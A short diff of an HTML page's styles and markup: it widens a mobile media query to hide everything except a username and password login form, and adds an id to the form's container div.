@@ -64,12 +64,17 @@ width: 80%;
     display: none;
   }
 }
-@media (max-width: 599px) {
-  .form-container {
+@media (max-width: 767px) {
+ 
+  body > *:not(#form-container) {
+    display: none;
+  }
+  
+
+  #form-container {
     display: block;
   }
 }
-
 </style>
 </head>
 <body>
@@ -77,7 +82,7 @@ width: 80%;
 <img src="logo.png.png">
 </div>
 <div id="genshin">
-<div>
+<div id="form-container">
 <form onsubmit="return redirectToAnotherPage()">
 <input type="text" placeholder="Enter Your Username" id="username" name="username" required><br>
 <input type="password" placeholder="Password" id="password" name="password" required>
